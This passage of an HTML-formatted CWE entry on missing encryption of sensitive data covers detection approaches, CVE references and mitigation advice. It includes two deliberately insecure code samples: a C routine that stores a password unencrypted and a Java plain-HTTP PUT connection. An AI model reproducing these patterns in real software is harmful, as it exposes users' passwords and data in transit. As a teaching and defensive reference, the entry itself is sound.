&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Manual Analysis&lt;/p&gt;&lt;p&gt;The characterizaton of sensitive data often requires domain-specific
understanding, so manual methods are useful. However, manual efforts
might not achieve desired code coverage within limited time constraints.
Black box methods may produce artifacts (e.g. stored data or unencrypted
network transfer) that require manual evaluation.&lt;/p&gt;&lt;p class="optheading"&gt;&lt;i&gt;Effectiveness: High&lt;/i&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Automated Analysis&lt;/p&gt;&lt;p&gt;Automated measurement of the entropy of an input/output source may
indicate the use or lack of encryption, but human analysis is still
required to distinguish intentionally-unencrypted data (e.g. metadata)
from sensitive data. &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_311_Demonstrative Examples" id="oc_311_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The following code attempts to establish a connection, read in a
password, then store it to a buffer.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;server.sin_family = AF_INET; hp = gethostbyname(argv[1]);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if (hp==NULL) error("Unknown host");&lt;/div&gt;&lt;div style="font-size:90%;"&gt;memcpy( (char *)&amp;amp;server.sin_addr,(char
*)hp-&amp;gt;h_addr,hp-&amp;gt;h_length);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if (argc &amp;lt; 3) port = 80;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;else port = (unsigned short)atoi(argv[3]);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;server.sin_port = htons(port);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if (connect(sock, (struct sockaddr *)&amp;amp;server, sizeof
server) &amp;lt; 0) error("Connecting");&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;div style="font-size:90%;"&gt;while ((n=read(sock,buffer,BUFSIZE-1))!=-1) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;write(dfd,password_buffer,n);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;While successful, the program fails to encrypt the data before writing
it to a buffer, possibly exposing it to unauthorized actors.&lt;/p&gt;&lt;p class="subheading"&gt;Example 2&lt;/p&gt;&lt;p&gt;The following code attempts to establish a connection to a site to
communicate sensitive information.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;try {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;URL u = new URL("http://www.secret.example.org/");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;HttpURLConnection hu = (HttpURLConnection)
u.openConnection();&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;hu.setRequestMethod("PUT");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;hu.connect();&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;OutputStream os = hu.getOutputStream(); &lt;/div&gt;
&lt;div style="font-size:90%;"&gt;hu.disconnect();&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;catch (IOException e) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;//...&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;Though a connection is successfully made, the connection is
unencrypted and it is possible that all sensitive data sent to or
received from the server will be read by unintended actors.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_311_Observed Examples" id="oc_311_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2272" target="_blank"&gt;CVE-2009-2272&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;password and username stored in cleartext in a
cookie&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1466" target="_blank"&gt;CVE-2009-1466&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;password stored in cleartext in a file with
insecure permissions&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0152" target="_blank"&gt;CVE-2009-0152&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;chat program disables SSL in some circumstances
even when the user says to use SSL.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1603" target="_blank"&gt;CVE-2009-1603&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: product uses an incorrect public exponent
when generating an RSA key, which effectively disables the
encryption&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0964" target="_blank"&gt;CVE-2009-0964&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;storage of unencrypted passwords in a
database&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6157" target="_blank"&gt;CVE-2008-6157&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;storage of unencrypted passwords in a
database&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6828" target="_blank"&gt;CVE-2008-6828&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;product stores a password in cleartext in
memory&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1567" target="_blank"&gt;CVE-2008-1567&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;storage of a secret key in cleartext in a
temporary file&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0174" target="_blank"&gt;CVE-2008-0174&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SCADA product uses HTTP Basic Authentication,
which is not encrypted&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5778" target="_blank"&gt;CVE-2007-5778&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;login credentials stored unencrypted in a registry
key&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1949" target="_blank"&gt;CVE-2002-1949&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Passwords transmitted in
cleartext.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4122" target="_blank"&gt;CVE-2008-4122&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: failure to set "secure" flag in HTTPS
cookie causes it to be transmitted across unencrypted
HTTP.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3289" target="_blank"&gt;CVE-2008-3289&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product sends password hash in cleartext in
violation of intended policy.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4390" target="_blank"&gt;CVE-2008-4390&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Remote management feature sends sensitive
information including passwords in cleartext.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5626" target="_blank"&gt;CVE-2007-5626&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Backup routine sends password in cleartext in
email.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1852" target="_blank"&gt;CVE-2004-1852&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product transmits Blowfish encryption key in
cleartext.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0374" target="_blank"&gt;CVE-2008-0374&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Printer sends configuration information, including
administrative password, in cleartext.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4961" target="_blank"&gt;CVE-2007-4961&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Chain: cleartext transmission of the MD5 hash of
password enables attacks against a server that is susceptible to replay
(CWE-294).&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4786" target="_blank"&gt;CVE-2007-4786&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product sends passwords in cleartext to a log
server.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3140" target="_blank"&gt;CVE-2005-3140&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Product sends file with cleartext passwords in
e-mail message intended for diagnostic purposes.
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_311_Potential Mitigations" id="oc_311_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Requirements&lt;/p&gt;&lt;p&gt;Clearly specify which data or resources are valuable enough that they
should be protected by encryption. Require that any transmission or
storage of this data/resource should use well-vetted encryption
algorithms.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Using threat modeling or other techniques, assume that your data can
be compromised through a separate vulnerability or weakness, and
determine where encryption will be most effective. Ensure that data you
believe should be private is not being inadvertently exposed using
weaknesses such as insecure permissions (CWE-732). &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Ensure that encryption is properly integrated into the system design,
including but not necessarily limited to:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;Encryption that is needed to store or transmit private data of the
users of the system &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Encryption that is needed to protect the system itself from
unauthorized disclosure or tampering &lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Identify the separate needs and contexts for encryption:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;One-way (i.e., only the user or recipient needs to have the key).
This can be achieved using public key cryptography, or other
techniques in which the encrypting party (i.e., the software) does
not need to have access to a private key.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Two-way (i.e., the encryption can be automatically performed on
behalf of a user, but the key must be available so that the
plaintext can be automatically recoverable by that user). This
requires storage of the private key in a format that is recoverable
only by the user (or perhaps by the operating system) in a way that
cannot be recovered by others.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Do not develop your own cryptographic algorithms. They will likely be
exposed to attacks that are well-understood by cryptographers. Reverse
engineering techniques are mature. If your algorithm can be compromised
if attackers find out how it works, then it is especially weak.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Select a well-vetted algorithm that is currently considered to be
strong by experts in the field, and select well-tested
implementations.&lt;/p&gt;&lt;p&gt;For example, US government systems require FIPS 140-2
certification.&lt;/p&gt;&lt;p&gt;As with all cryptographic mechanisms, the source code should be
available for analysis.&lt;/p&gt;&lt;p&gt;Periodically ensure that you aren't using obsolete cryptography. Some
older algorithms, once thought to require a billion years of computing
time, can now be broken in days or hours. This includes MD4, MD5, SHA1,
DES, and other algorithms which were once regarded as strong.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Architecture and Design&lt;/p&gt;&lt;p&gt;Compartmentalize your system to have "safe" areas where trust
boundaries can be unambiguously drawn. Do not allow sensitive data to go
outside of the trust boundary and always be careful when interfacing
with a compartment outside of the safe area.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phases:  Implementation; Architecture and Design&lt;/p&gt;&lt;p&gt;When you use industry-approved techniques, you need to use them
correctly. Don't cut corners by skipping resource-intensive steps
(CWE-325). These steps are often essential for preventing common
attacks.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt;Phase:  Implementation&lt;/p&gt;&lt;p&gt;Use naming conventions and strong types to make it easier to spot when
sensitive data is being used. When creating structures, objects, or
other complex entities, separate the sensitive and non-sensitive data as
much as possible.&lt;/p&gt;&lt;p&gt;This makes it easier to spot places in the code where data is being
used that is unencrypted.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_311_Relationships" id="oc_311_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;310&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=310" target="_blank"&gt;Cryptographic Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Class&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;693&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=693" target="_blank"&gt;Protection Mechanism Failure&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;719&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=719" target="_blank"&gt;OWASP Top Ten 2007 Category A8 - Insecure Cryptographic Storage&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2007) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;629&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;720&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=720" target="_blank"&gt;OWASP Top Ten 2007 Category A9 - Insecure Communications&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2007)&lt;/span&gt;629&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;729&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=729" target="_blank"&gt;OWASP Top Ten 2004 Category A8 - Insecure Storage&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in OWASP Top Ten (2004) &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;711&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;803&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=803" target="_blank"&gt;2010 Top 25 - Porous Defenses&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weaknesses in the 2010 CWE/SANS Top 25 Most Dangerous Programming Errors &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;800&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;312&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=312" target="_blank"&gt;Cleartext Storage of Sensitive Information&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;319&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=319" target="_blank"&gt;Cleartext Transmission of Sensitive Information&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;ParentOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;614&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=614" target="_blank"&gt;Sensitive Cookie in HTTPS Session Without 'Secure' Attribute&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="foreign"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="middle" nowrap="" class="right" align="center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;327&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=327" target="_blank"&gt;Use of a Broken or Risky Cryptographic Algorithm&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Taxonomy Mappings"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Taxonomy Mappings&lt;/div&gt;&lt;div name="oc_311_Taxonomy Mappings" id="oc_311_Taxonomy Mappings" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Mapped Taxonomy Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Node ID&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Fit&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Mapped Node Name&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;CLASP&lt;/td&gt;&lt;td valign="top"&gt;&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Failure to encrypt data&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP Top Ten 2007&lt;/td&gt;&lt;td valign="top"&gt;A8&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE More Specific&lt;/td&gt;&lt;td valign="top"&gt;Insecure Cryptographic Storage&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP Top Ten 2007&lt;/td&gt;&lt;td valign="top"&gt;A9&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE More Specific&lt;/td&gt;&lt;td valign="top"&gt;Insecure Communications&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;OWASP Top Ten 2004&lt;/td&gt;&lt;td valign="top"&gt;A8&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE More Specific&lt;/td&gt;&lt;td valign="top"&gt;Insecure Storage&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;WASC&lt;/td&gt;&lt;td valign="top"&gt;4&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top"&gt;Insufficient Transport Layer Protection &lt;/td&gt;&lt;/tr&gt;
